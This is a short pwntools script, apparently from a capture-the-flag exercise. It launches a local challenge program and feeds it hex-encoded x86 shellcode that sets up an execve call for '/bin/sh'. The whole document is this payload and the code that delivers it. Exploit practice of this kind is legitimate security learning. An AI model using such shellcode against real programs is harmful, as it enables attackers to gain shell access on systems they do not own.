#!/usr/bin/env python3
from pwn import *

# Test payload
payload = "b86a703301800080682f736800682f62696e89e3b80b000000b900000000ba00000000e93c000000404840484048404840484048404840484048404840484048404840484048404840484048404840484048404840484048404840484048404840484048cd00ebfe"

print(f"Sending payload: {payload[:50]}...")

p = process(['python3', 'chal.py'], stdin=PTY)
p.sendlineafter(b'shellcode: ', payload.encode())

# Get all output
try:
    output = p.recvall(timeout=3)
    print(output.decode())
except:
    print("Timeout or error")
    print(p.poll())
